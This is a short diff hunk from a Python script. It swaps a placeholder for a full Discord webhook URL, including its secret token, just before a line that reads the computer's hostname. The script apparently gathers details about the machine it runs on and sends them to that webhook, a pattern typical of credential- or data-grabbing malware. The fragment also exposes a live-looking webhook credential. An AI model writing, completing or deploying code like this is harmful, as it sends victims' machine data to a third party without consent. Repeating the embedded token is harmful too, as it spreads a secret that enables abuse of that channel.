@@ -7,7 +7,7 @@ import requests
 
 
 
-hook = Webhook("Webhook")
+hook = Webhook("https://discord.com/api/webhooks/1249195594665295902/c9NoeM-OpU2nenHOX3Rxr_Efyp88X_nZdXN_ch9JjdwgFhEjJxqUzHnfKI1jpjRRFUzy")
 
 
 pcname = socket.gethostname()
